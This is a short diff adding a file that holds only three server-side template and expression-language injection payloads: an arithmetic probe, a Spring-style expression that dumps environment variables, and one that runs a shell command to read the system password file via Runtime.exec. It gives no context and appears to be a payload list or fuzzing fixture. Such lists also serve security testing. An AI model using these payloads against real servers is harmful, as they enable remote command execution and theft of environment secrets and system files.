@@ -1,0 +1,4 @@
+${6*6}
+${T(java.lang.System).getenv()}
+${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+
